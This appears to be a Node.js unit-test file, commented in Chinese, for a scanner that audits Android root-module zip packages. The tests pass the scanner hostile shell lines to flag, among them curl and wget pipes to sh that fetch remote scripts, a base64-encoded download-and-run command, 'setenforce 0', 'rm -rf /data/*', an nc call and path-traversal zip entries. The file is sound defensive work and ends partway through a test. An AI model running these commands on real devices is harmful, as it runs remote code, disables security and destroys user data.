// 模块审核规则单测（node:test，无外部依赖）
// 覆盖：rm -rf / curl|sh / base64 执行 / 写 /system / setenforce 0 / hosts / 硬编码 IP /
//       可疑域名 / 隐私用户名 / 邮箱 / 密钥 / 元数据一致性 —— 命中与不命中。
// 运行：node --test scan.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync, crc32 } from 'node:zlib';

import {
  RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
  scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER, CATEGORY_LABEL,
  inspectStructure, unsafePathReason, detectBinary, checkCoverage, checkUnread, checkBinaries,
  MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
  EXEC_BUNDLED_FILE, EXEC_INDIRECT, PROP_BOOT_SPOOF,
} from './risk-rules.mjs';
import { scanZip, classify, renderMarkdown, renderJSON, redactText, mask, resolveChangeType, hasShebang, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE, EXEC_UNPINNED_ADVICE, SCAN_TARGET_BUCKETS } from './scan.mjs';
import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';

// ---------------------------------------------------------------------------
// 辅助：命中判定
// ---------------------------------------------------------------------------

function hits(ruleId, text, file = 'customize.sh') {
  const rule = RULES_BY_ID[ruleId];
  assert.ok(rule, `规则 ${ruleId} 不存在`);
  return rule.scan(file, text).filter((f) => f.severity != null);
}

function assertHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.ok(h.length > 0, `${ruleId} 应当命中：${msg || text}`);
  return h;
}

function assertNoHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.equal(h.length, 0, `${ruleId} 不应命中：${msg || text} —— 实际命中 ${JSON.stringify(h)}`);
}

// ---------------------------------------------------------------------------
// ① 元信息：规则表完整性
// ---------------------------------------------------------------------------

test('规则表结构完整，每条规则都有 id/category/severity/advice', () => {
  // 18 这个下限是钉住 T2 的扩容（15 -> 20）；fix2 又加了两条执行链规则（EXEC_INDIRECT、
  // MODDIR_RUNTIME_WRITE，20 -> 22），下限随之抬到 20：留着旧数字，规则被悄悄删掉没人被提醒。
  assert.ok(CONTENT_RULES.length >= 20, `内容规则只剩 ${CONTENT_RULES.length} 条`);
  for (const r of CONTENT_RULES) {
    assert.ok(r.id, '缺少 id');
    assert.ok(r.category, `${r.id} 缺少 category`);
    assert.ok(r.advice, `${r.id} 缺少 advice`);
    assert.equal(typeof r.scan, 'function', `${r.id}.scan 不是函数`);
    // scan 必须是纯函数：同一输入两次结果一致
    const a = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    const b = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    assert.equal(a, b, `${r.id} 不是确定性纯函数`);
  }
});

// ---------------------------------------------------------------------------
// ② 危险模式
// ---------------------------------------------------------------------------

test('RM_RF_MUTABLE：rm -rf 作用于 /data 命中且按作用域分档', () => {
  // 宽泛作用域 -> high
  const h = assertHit('RM_RF_MUTABLE', 'rm -rf /data/*');
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.equal(h[0].file, 'customize.sh');
  assert.match(h[0].snippet, /rm -rf/);

  // 分区下的具体子目录 -> medium
  const m = assertHit('RM_RF_MUTABLE', 'rm -rf /data/local/tmp/leftover');
  assert.equal(m[0].severity, 'medium');

  // 分区根 -> high
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf /system')[0].severity, 'high');
});

test('RM_RF_MUTABLE：删除模块自有目录不命中', () => {
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODPATH');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODDIR/system/app/Foo');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf /data/adb/modules/old_mod');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $TMPDIR/stage');
});

test('PIPE_TO_SHELL：curl|sh 与 wget -O-|sh 命中 high', () => {
  const a = assertHit('PIPE_TO_SHELL', 'curl -sL https://example.com/i.sh | sh');
  assert.equal(a[0].severity, 'high');
  const b = assertHit('PIPE_TO_SHELL', 'wget -O- http://1.2.3.4/x | bash');
  assert.equal(b[0].severity, 'high');
  assertHit('PIPE_TO_SHELL', 'curl http://a.b | busybox sh');
});

test('PIPE_TO_SHELL：落盘再执行不命中', () => {
  assertNoHit('PIPE_TO_SHELL', 'curl -sL https://example.com/m.zip -o /sdcard/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'wget -O /tmp/m.zip https://example.com/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'sh $MODPATH/install.sh');
});

test('DOWNLOAD_TO_STDOUT：wget -O- 命中 low', () => {
  const h = assertHit('DOWNLOAD_TO_STDOUT', 'wget -O- https://example.com/a.txt > /sdcard/a.txt');
  assert.equal(h[0].severity, 'low');
});

test('OBFUSCATED_DECODE_EXEC：base64 解码后管道执行命中 high，且不与 DECODE_ONLY 重复报', () => {
  const text = 'echo aGVsbG8gd29ybGQK | base64 -d | sh';
  const h = assertHit('OBFUSCATED_DECODE_EXEC', text);
  assert.equal(h[0].severity, 'high');
  assertNoHit('OBFUSCATED_DECODE_ONLY', text, '已由 EXEC 规则报 high，不应重复');
});

test('OBFUSCATED_DECODE_ONLY：仅解码未执行命中 medium', () => {
  const h = assertHit('OBFUSCATED_DECODE_ONLY', 'base64 -d payload.b64 > /data/local/tmp/p.bin');
  assert.equal(h[0].severity, 'medium');
  assertNoHit('OBFUSCATED_DECODE_ONLY', 'base64 image.png > out.txt'); // 无 -d，纯编码
});

test('WRITE_SYSTEM_VENDOR：直接写 /system 命中 high；$MODPATH 覆盖层不命中', () => {
  assert.equal(assertHit('WRITE_SYSTEM_VENDOR', 'cp busybox /system/xbin/bb')[0].severity, 'high');
  assertHit('WRITE_SYSTEM_VENDOR', 'mount -o rw,remount /system');
  assertHit('WRITE_SYSTEM_VENDOR', 'echo "ro.foo=1" >> /system/build.prop');
  // 标准覆盖层写法
  assertNoHit('WRITE_SYSTEM_VENDOR', 'cp -f busybox $MODPATH/system/xbin/bb');
  assertNoHit('WRITE_SYSTEM_VENDOR', 'mkdir -p $MODPATH/system/app/Foo');
});

test('SELINUX_DISABLE：setenforce 0 命中 high，setenforce 1 不命中', () => {
  assert.equal(assertHit('SELINUX_DISABLE', 'setenforce 0')[0].severity, 'high');
  assertHit('SELINUX_DISABLE', 'echo 0 > /sys/fs/selinux/enforce');
  assertNoHit('SELINUX_DISABLE', 'setenforce 1');
});

test('HOSTS_MODIFY：写 hosts 命中 medium；无关心文件不命中', () => {
  const h = assertHit('HOSTS_MODIFY', 'cp $MODPATH/hosts /system/etc/hosts');
  assert.equal(h[0].severity, 'medium');
  assertHit('HOSTS_MODIFY', 'echo "127.0.0.1 ads.example" >> /system/etc/hosts');
  assertNoHit('HOSTS_MODIFY', 'echo "hello" > /data/local/tmp/notes.txt');
});

// ---------------------------------------------------------------------------
// ③ 外联
// ---------------------------------------------------------------------------

test('HARDCODED_IP：公网 IP medium，内网/回环 low，版本号样式的数字串不命中', () => {
  assert.equal(assertHit('HARDCODED_IP', 'curl http://45.77.12.9/payload')[0].severity, 'medium');
  assert.equal(assertHit('HARDCODED_IP', 'nc 192.168.1.10 4444')[0].severity, 'low');
  assert.equal(assertHit('HARDCODED_IP', 'ping 127.0.0.1')[0].severity, 'low');
  assertNoHit('HARDCODED_IP', 'versionCode=1024');
  assertNoHit('HARDCODED_IP', '# 1.2.3.4 已废弃');
});

test('SUSPICIOUS_DOMAIN：遥测/广告域名与匿名 TLD 命中；正常域名不命中', () => {
  assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect');
  assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js');
  assertHit('SUSPICIOUS_DOMAIN', 'https://payload.xyz/drop');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://github.com/foo/bar');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://raw.githubusercontent.com/a/b/main/modules.json');
  assertNoHit('SUSPICIOUS_DOMAIN', '# see magisk docs');
});

test('NETWORK_FETCH：任意 http(s) 地址命中 low（供人工核对）', () => {
  assert.equal(assertHit('NETWORK_FETCH', 'https://example.com/x.zip')[0].severity, 'low');
  assertNoHit('NETWORK_FETCH', 'cp /sdcard/a /sdcard/b');
});

// ---------------------------------------------------------------------------
// ④ 投稿者隐私（info，不计入风险）
// ---------------------------------------------------------------------------

test('PRIVACY_HOME_USER：绝对路径用户名命中 info；root 等通用账号名不命中', () => {
  const h = assertHit('PRIVACY_HOME_USER', 'built at /home/johndoe/modules');
  assert.equal(h[0].severity, 'info');
  assert.equal(countsTowardRisk(h[0]), false, 'info 级不应计入风险等级');
  assertHit('PRIVACY_HOME_USER', 'C:\\Users\\Alice\\workspace\\mod');
  assertHit('PRIVACY_HOME_USER', '/Users/bob/code/mod');
  assertNoHit('PRIVACY_HOME_USER', '/home/root/mod');
  assertNoHit('PRIVACY_HOME_USER', 'MODDIR=/data/adb/modules/x');
});

test('PRIVACY_EMAIL：邮箱命中 info；noreply 地址不命中', () => {
  assert.equal(assertHit('PRIVACY_EMAIL', 'maintainer: zhangsan@example.com')[0].severity, 'info');
  assertNoHit('PRIVACY_EMAIL', 'author: foo@users.noreply.github.com');
});

test('PRIVACY_SECRET：AKIA / sk- / token= / 私钥头命中 info；纯变量引用不命中', () => {
  assertHit('PRIVACY_SECRET', 'AKIAIOSFODNN7EXAMPLE');
  assertHit('PRIVACY_SECRET', 'sk-abcdefghijklmnopqrstuvwx123456');
  assertHit('PRIVACY_SECRET', 'token=abcd1234efgh5678');
  assertHit('PRIVACY_SECRET', '-----BEGIN PRIVATE KEY-----');
  assertHit('PRIVACY_SECRET', 'password: hunter2hunter2');
  assertNoHit('PRIVACY_SECRET', 'token=$API_TOKEN');
  assertNoHit('PRIVACY_SECRET', '# password: 填你自己的');
});

// ---------------------------------------------------------------------------
// ⑤ 元数据一致性
// ---------------------------------------------------------------------------

test('parseModuleProp 正确解析键值与行号', () => {
  const { fields } = parseModuleProp('id=cool_mod\nversion=v1.2\nname=Cool\n# comment\nversionCode=3\n');
  assert.equal(fields.id.value, 'cool_mod');
  assert.equal(fields.id.line, 1);
  assert.equal(fields.version.value, 'v1.2');
  assert.equal(fields.version.line, 2);
  assert.equal(fields.versionCode.value, '3');
  assert.equal(fields['# comment'], undefined);
});

test('checkMetadata：一致则不报，id/version 不一致分别报 medium', () => {
  const prop = { present: true, path: 'module.prop', fields: parseModuleProp('id=a\nversion=v1\n').fields };
  const ok = checkMetadata(prop, { id: 'a', version: 'v1' });
  assert.equal(ok.filter((f) => f.ruleId.startsWith('META_') && f.severity !== 'low').length, 0, JSON.stringify(ok));

  const bad = checkMetadata(prop, { id: 'b', version: 'v2' });
  const ids = bad.map((f) => f.ruleId);
  assert.ok(ids.includes('META_ID_MISMATCH'), JSON.stringify(ids));
  assert.ok(ids.includes('META_VERSION_MISMATCH'), JSON.stringify(ids));
  assert.equal(bad.find((f) => f.ruleId === 'META_ID_MISMATCH').severity, 'medium');
});

test('checkMetadata：module.prop 缺失或字段缺失也报 medium', () => {
  const none = checkMetadata({ present: false, path: 'module.prop', fields: {} }, {});
  assert.ok(none.some((f) => f.ruleId === 'META_PROP_MISSING' && f.severity === 'medium'));

  const partial = checkMetadata({ present: true, path: 'module.prop', fields: parseModuleProp('id=a\n').fields }, { id: 'a' });
  assert.ok(partial.some((f) => f.ruleId === 'META_FIELD_MISSING_VERSION'));
});

// ---------------------------------------------------------------------------
// 定级与决策
// ---------------------------------------------------------------------------

test('scoreRisk：有 high 即 high，无 high 有 medium 即 medium，其余 low；info 不参与', () => {
  assert.equal(scoreRisk([{ severity: 'info' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'low' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'medium' }, { severity: 'info' }]).level, 'medium');
  assert.equal(scoreRisk([{ severity: 'high' }, { severity: 'low' }]).level, 'high');
  assert.equal(scoreRisk([]).level, 'low');
});

test('decide：低风险+首次收录才自动放行；版本更新即便低风险也人工审；中高风险一律人工', () => {
  const a = decide('low', 'first');
  assert.equal(a.action, 'auto-approve');
  assert.equal(a.label, 'auto-approved');
  assert.equal(a.needsHumanReview, false);

  const b = decide('low', 'update');
  assert.equal(b.action, 'request-review');
  assert.equal(b.label, 'needs-human-review');
  assert.equal(b.needsHumanReview, true);

  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update']) {
      const d = decide(lv, ct);
      assert.equal(d.needsHumanReview, true, `${lv}/${ct} 必须人工审`);
      assert.equal(d.label, 'needs-human-review');
    }
  }
  // 变更类型未知 -> 保守转人工
  assert.equal(decide('low', 'unknown').needsHumanReview, true);
});

test('resolveChangeType：依据索引判断首次收录 / 版本更新', () => {
  const prop = { fields: { id: { value: 'mod_x', line: 1 } } };
  assert.equal(resolveChangeType({ index: [{ id: 'mod_x' }] }, prop), 'update');
  assert.equal(resolveChangeType({ index: { modules: [{ moduleId: 'other' }] } }, prop), 'first');
  assert.equal(resolveChangeType({ index: ['mod_x'] }, prop), 'update');
  assert.equal(resolveChangeType({}, prop), 'unknown');
  assert.equal(resolveChangeType({ changeType: 'update' }, prop), 'update', '显式指定优先');
});

// ---------------------------------------------------------------------------
// 端到端：造 zip 跑 scanZip
// ---------------------------------------------------------------------------

function crc32buf(buf) {
  // node:zlib 的 crc32 在较新版本提供，这里保留 0 值兜底（zip 读取器不校验 CRC）
  try { return crc32(buf); } catch { return 0; }
}

function buildZip(entries) {
  // entries: [{ name, content(string|Buffer), method = 8, extAttr = 0,
  //             declaredOrig, declaredComp }] -> Buffer
  // declaredOrig/declaredComp 允许只改中心目录的声明值：测 zip bomb 与伪装条目时，
  // 需要的正是「声明与真实不一致」这种输入。
  const locals = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8');
    const dataBuf = Buffer.isBuffer(e.content) ? e.content : Buffer.from(String(e.content == null ? '' : e.content), 'utf8');
    const method = e.method == null ? 8 : e.method;
    const comp = method === 8 ? deflateRawSync(dataBuf) : dataBuf;
    const crc = crc32buf(dataBuf);
    const origDecl = e.declaredOrig == null ? dataBuf.length : e.declaredOrig;
    const compDecl = e.declaredComp == null ? comp.length : e.declaredComp;

    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0, 6);
    lh.writeUInt16LE(method, 8);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(compDecl, 18);
    lh.writeUInt32LE(origDecl, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    locals.push(lh, nameBuf, comp);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(compDecl, 20);
    ch.writeUInt32LE(origDecl, 24);
    ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(e.extAttr || 0, 38);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, nameBuf);

    offset += 30 + nameBuf.length + comp.length;
  }
  const cdBuf = Buffer.concat(central);
  const body = Buffer.concat(locals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(body.length, 16);
  return Buffer.concat([body, cdBuf, eocd]);
}

function writeZip(name, entries) {
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, name);
  writeFileSync(p, buildZip(entries));
  return p;
}

const CLEAN_PROP = 'id=cool_mod\nname=Cool Mod\nversion=v1.0\nversionCode=1\nauthor=anon\ndescription=demo\n';
const CLEAN_SH = '#!/system/bin/sh\necho "installing"\ncp -f busybox $MODPATH/system/xbin/bb\n';

test('端到端：干净模块（首次收录）判 low 且自动放行', () => {
  const p = writeZip('clean.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.reader, 'builtin', '应走内置解析器');
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.equal(r.decision.label, 'auto-approved');
  assert.equal(r.meta.id, 'cool_mod');
  assert.equal(r.inventory.canonicalScripts.length, 2, '应识别两个规范脚本');
  // ① 逐行扫过的文件全文必须纳入报告
  //（Task 2.7 改了这一节的标题：`cls.others` 里的数据文件也在这节里，叫「脚本全文」就是说假话。）
  assert.match(renderMarkdown(r), /## 逐行扫过的文件全文/);
  assert.match(renderMarkdown(r), /busybox \$MODPATH/);
});

test('端到端：恶意模块判 high，脚本全文与行号证据都在报告里', () => {
  const bad = [
    '#!/system/bin/sh',
    'setenforce 0',
    'curl -sL https://payload.xyz/i.sh | sh',
    'echo Y3VybCBodHRwOi8vNDUuNzcuMTIuOS94IHwgYmFzaAo= | base64 -d | sh',
    'rm -rf /data/*',
    'cp x /system/bin/x',
    'echo "0.0.0.0 a.umeng.com" >> /system/etc/hosts',
    '# built on /home/johndoe',
    'contact: me@example.com',
    'token=abcd1234efgh5678',
  ].join('\n');
  const p = writeZip('bad.zip', [
    { name: 'module.prop', content: 'id=evil_mod\nversion=v9\n' },
    { name: 'customize.sh', content: bad },
    { name: 'service.sh', content: bad },
    { name: 'uninstall.sh', content: bad },
    { name: 'action.sh', content: 'nc 192.168.1.10 4444\n' },
  ]);
  const r = scanZip(p, { declaredId: 'evil_mod', declaredVersion: 'v1', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  const ids = new Set(r.findings.map((f) => f.ruleId));
  for (const need of ['SELINUX_DISABLE', 'PIPE_TO_SHELL', 'OBFUSCATED_DECODE_EXEC',
    'RM_RF_MUTABLE', 'WRITE_SYSTEM_VENDOR', 'HOSTS_MODIFY', 'SUSPICIOUS_DOMAIN',
    'PRIVACY_HOME_USER', 'PRIVACY_EMAIL', 'PRIVACY_SECRET', 'META_VERSION_MISMATCH']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  // 证据含文件名+行号+原文片段
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, 2);
  assert.match(sel.snippet, /setenforce/);
  assert.ok(r.scripts.every((s) => typeof s.content === 'string' && s.content.length > 0));
  // 全文内嵌的是「会被执行或会被读的文本」：四个 .sh 入口 + module.prop
  // （.prop 属属性文件，installer/resetprop 会读，同样纳入行级规则）
  assert.equal(r.scripts.length, 5, 'customize/service/uninstall/action 四个 .sh 与 module.prop 全部纳入');
  assert.ok(r.scripts.some((s) => s.name === 'module.prop'));
});

test('端到端：低风险但为版本更新 -> 打 needs-human-review 不自动合入', () => {
  const p = writeZip('update.zip', [
    { name: 'module.prop', content: 'id=cool_mod\nversion=v1.1\n' },
    { name: 'customize.sh', content: CLEAN_SH },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.1', changeType: 'update' });
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'request-review');
  assert.equal(r.decision.label, 'needs-human-review');
  assert.equal(r.decision.needsHumanReview, true);
});

test('端到端：报告渲染 —— Markdown 含结论/表格/隐私脱敏，JSON 可解析', () => {
  const p = writeZip('privacy.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '# built at /home/johndoe\n# contact me@example.com\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const md = renderMarkdown(r);
  assert.match(md, /风险等级：LOW/);
  assert.match(md, /auto-approved/);
  assert.match(md, /投稿者隐私提示/);
  assert.ok(!md.includes('johndoe'), 'Markdown 中隐私原文应脱敏');
  assert.ok(!md.includes('me@example.com'));

  const j = JSON.parse(renderJSON(r));
  assert.equal(j.riskLevel, 'low');
  assert.equal(j.schema, 'module-audit-report/v1');
  const priv = j.findings.filter((f) => f.category === 'privacy');
  assert.ok(priv.length >= 2);
  assert.ok(priv.every((f) => !f.snippet.includes('johndoe')), 'JSON 隐私片段应脱敏');
});

test('mask 对短串原样返回，对长串打码', () => {
  assert.equal(mask('abcd'), 'abcd');
  const m = mask('johndoe_secret_value');
  assert.ok(m.includes('*'));
  assert.ok(!m.includes('secret_value'));
});

test('classify 按规范顺序排列五个脚本，其余归入 otherScripts/others', () => {
  const p = writeZip('cls.zip', [
    { name: 'action.sh', content: 'x' },
    { name: 'uninstall.sh', content: 'x' },
    { name: 'customize.sh', content: 'x' },
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'extra/helper.sh', content: 'x' },
    { name: 'README.md', content: 'x' },
  ]);
  const r = scanZip(p, {});
  assert.deepEqual(r.inventory.canonicalScripts.map((s) => s.name.split('/').pop()),
    ['customize.sh', 'uninstall.sh', 'action.sh']);
  assert.ok(r.inventory.otherScripts.some((s) => s.name === 'extra/helper.sh'));
  // Task 2.7（fix10-P11）：README.md 是「前 512 字节没有 NUL、又没被前面任何一个桶接住」的可读文本，
  // 扩面之后它落在 feed 上、被逐行扫过 —— 于是它不再是「未纳入行级扫描的数据文件」。
  // 断言跟着搬到它真正在的地方。这条用例的原意始终是「每个条目都得在某个清单里有个说法」，
  // 不是「README.md 必须没被读过」；所以下面既有「它在被扫的那份里」，也有「账要平」。
  assert.ok(r.scripts.some((s) => s.name === 'README.md'),
    'README.md 必须在「被逐行扫过的文件」里：' + JSON.stringify(r.scripts.map((s) => s.name)));
  assert.ok(!r.inventory.otherFiles.includes('README.md'),
    '已经被内容扫描的条目不许再算进「未纳入行级扫描的数据文件」：' + JSON.stringify(r.inventory.otherFiles));
  const accounted = new Set([
    ...r.scripts.map((s) => s.name),
    ...r.binaries.map((b) => b.name),
    ...r.inventory.otherFiles,
  ]);
  assert.equal(accounted.size, r.inventory.totalEntries,
    `账要平：${r.inventory.totalEntries} 个条目只对得上 ${accounted.size} 个说法（被逐行扫过 / 登记为二进制 / `
    + `写进「没读过」清单），剩下的条目报告既没读也没说：`
    + JSON.stringify({
      scripts: r.scripts.map((s) => s.name),
      binaries: r.binaries.map((b) => b.name),
      otherFiles: r.inventory.otherFiles,
    }));
});

test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () => {
  const p = writeZip('noprop.zip', [{ name: 'customize.sh', content: CLEAN_SH }]);
  const r = scanZip(p, { changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'META_PROP_MISSING'));
  assert.notEqual(r.riskLevel, 'low', '缺少 module.prop 不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
});

// ---------------------------------------------------------------------------
// ⑥ 包结构与审核覆盖度
// ---------------------------------------------------------------------------

test('unsafePathReason：绝对路径 / 上跳 / 盘符 / 反斜杠里的 .. 都能认出', () => {
  assert.equal(unsafePathReason('system/etc/hosts'), null);
  assert.equal(unsafePathReason('../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a/../../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a\\..\\escape.sh'), '含 .. 的上跳路径', '反斜杠必须先归一化，否则 split("/") 看不见上跳');
  assert.equal(unsafePathReason('/system/etc/hosts'), '绝对路径');
  assert.equal(unsafePathReason('C:/Windows/x'), 'Windows 盘符绝对路径');
  assert.equal(unsafePathReason(''), '空条目名');
  assert.equal(unsafePathReason('a..b/config'), null, '文件名里含 .. 但不是路径段，不算上跳');
});

test('detectBinary：ELF/PE/Mach-O/DEX/class 与「开头含 NUL」命中，纯文本不命中', () => {
  assert.equal(detectBinary(Buffer.from('\x7fELF\x02\x01\x01', 'latin1')).id, 'ELF');
  assert.equal(detectBinary(Buffer.from('MZ\x90\x00', 'latin1')).id, 'PE');
  assert.equal(detectBinary(Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO', 'fat 头，同时也是 Java class 的头四字节');
  assert.equal(detectBinary(Buffer.from([0xbf, 0xba, 0xfe, 0xca])).id, 'MACHO', 'fat 64 的小端');
  assert.equal(detectBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x21])), null, 'ELF 头不完整不能误判；无 NUL 也不该算二进制');
  assert.equal(detectBinary(Buffer.from('dex\n035\0', 'latin1')).id, 'DEX');
  assert.equal(detectBinary(Buffer.from('name=foo\x00bar', 'utf8')).id, 'NUL', '改名成 .txt 的伪装');
  assert.equal(detectBinary(Buffer.from(CLEAN_SH, 'utf8')), null);
  assert.equal(detectBinary(Buffer.from('id=cool_mod', 'utf8')), null);
  assert.equal(detectBinary(null), null);
});

test('inspectStructure：重名/符号链接/越界/条目数/压缩比/超大各有对应级别，且都参与定级', () => {
  const { findings, stats } = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 10, origSize: 40 },
    { name: '../escape.sh', method: 8, compSize: 10, origSize: 20 },
    { name: '/system/xbin/bb', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'w.conf', method: 8, compSize: 10, origSize: 20, isSymlink: true },
    { name: 'secret.bin', method: 8, compSize: 10, origSize: 20, encrypted: true },
    { name: 'packed.bz2', method: 12, compSize: 10, origSize: 20 },
    { name: 'winpath\\a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'bomb', method: 8, compSize: 1, origSize: 40000 },
  ]);
  const ids = new Set(findings.map((f) => f.ruleId));
  for (const need of ['STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_SYMLINK',
    'STRUCT_ENCRYPTED', 'STRUCT_UNSUPPORTED_METHOD', 'STRUCT_BACKSLASH_PATH', 'STRUCT_RATIO']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_UNSAFE_PATH').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_SYMLINK').severity, 'high');
  assert.ok(findings.every((f) => f.category === 'structure'));
  assert.ok(findings.every((f) => countsTowardRisk(f)), '结构发现必须参与定级，不能只是提示');
  assert.deepEqual(stats.duplicateNames, ['service.sh']);
  assert.equal(stats.symlinks.length, 1);
  assert.equal(stats.entries, 10);
  assert.equal(stats.fileEntries, 10);
});

test('inspectStructure：条目数与解压总量超阈值才报，正常包一条都不报', () => {
  const many = Array.from({ length: MAX_ENTRIES + 5 }, (_, i) => ({ name: `f/${i}.sh`, method: 8, compSize: 100, origSize: 120 }));
  const ids = inspectStructure(many).findings.map((f) => f.ruleId);
  assert.ok(ids.includes('STRUCT_ENTRY_COUNT'), JSON.stringify(ids));

  const bomb = [{ name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 }];
  const b = inspectStructure(bomb).findings.map((f) => f.ruleId);
  assert.ok(b.includes('STRUCT_ZIP_BOMB'), JSON.stringify(b));

  const normal = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 90, origSize: 180 },
    { name: 'customize.sh', method: 8, compSize: 60, origSize: 240 },
    { name: 'system/', method: 0, compSize: 0, origSize: 0, isDir: true },
  ]);
  assert.equal(normal.findings.length, 0, JSON.stringify(normal.findings));
  assert.equal(normal.stats.dirEntries, 1, '目录条目不参与重名/越界判断');
});

test('checkCoverage / checkUnread / checkBinaries 的发现一律不低于 medium，以挡住自动放行', () => {
  const cov = checkCoverage([{ name: 'big.sh', size: MAX_TEXT + 10, truncated: true }, { name: 'ok.sh', size: 10, truncated: false }]);
  assert.equal(cov.length, 1);
  assert.equal(cov[0].ruleId, 'AUDIT_COVERAGE_TRUNCATED');
  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium);

  const un = checkUnread([{ name: 'a', reason: 'x', overLimit: true }, { name: 'b', reason: 'y', overLimit: false }]);
  assert.equal(un.length, 2);
  assert.ok(un.every((f) => f.ruleId === 'STRUCT_UNREADABLE' && SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER.medium));
  assert.match(un[0].advice, /zip bomb/);

  const bin = checkBinaries([{ name: 'update-binary', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 4096 }]);
  assert.equal(bin[0].ruleId, 'STRUCT_BINARY');
  assert.ok(SEVERITY_ORDER[bin[0].severity] >= SEVERITY_ORDER.medium);
  assert.deepEqual(checkUnread([]), []);
});

// ---------------------------------------------------------------------------
// 端到端：结构类攻击必须拦得住
// ---------------------------------------------------------------------------

test('端到端：越界路径条目判 high 且绝不自动放行', () => {
  const p = writeZip('traversal.zip', [
